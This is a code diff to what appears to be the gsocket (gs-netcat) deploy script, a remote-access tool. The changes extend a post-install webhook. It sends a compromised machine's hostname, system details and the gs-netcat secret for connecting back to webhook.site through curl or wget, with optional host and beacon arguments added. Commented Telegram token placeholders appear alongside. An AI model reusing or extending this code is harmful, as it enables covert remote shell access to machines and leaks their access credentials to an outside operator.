@@ -160,7 +160,13 @@ unset URL_BASE_CDN URL_BASE_X
 
 # WEBHOOKS are executed after a successful install
 # shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
-msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
+GS_EXTRA_ARGS=()
+[[ -n $GS_HOST ]] && GS_EXTRA_ARGS+=(" GS_HOST=$GS_HOST")
+
+GS_EXTRA_OPTIONS=()
+[[ -n $GS_BEACON ]] && GS_EXTRA_OPTIONS+=("-w")
+
+msg='$(hostname) --- $(uname -rom)${GS_EXTRA_ARGS:+ ---${GS_EXTRA_ARGS[*]}} gs-netcat -i -s ${GS_SECRET} ${GS_EXTRA_OPTIONS}'
 ### Telegram
 # GS_TG_TOKEN="5794110125:AAFDNb..."
 # GS_TG_CHATID="-8834838..."
@@ -177,7 +183,7 @@ msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 # GS_WEBHOOK_KEY="dc3c1af9-ea3d-4401-9158-eb6dda735276"
 [[ -n $GS_WEBHOOK_KEY ]] && {
 	# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
-	data='{"hostname": "$(hostname)", "system": "$(uname -rom)", "access": "gs-netcat -i -s ${GS_SECRET}"}'
+	data='{"hostname": "$(hostname)", "system": "$(uname -rom)", "access": "${GS_EXTRA_ARGS:+${GS_EXTRA_ARGS[*]}} gs-netcat -i -s ${GS_SECRET} ${GS_EXTRA_OPTIONS}"}'
 	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
 	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
 }
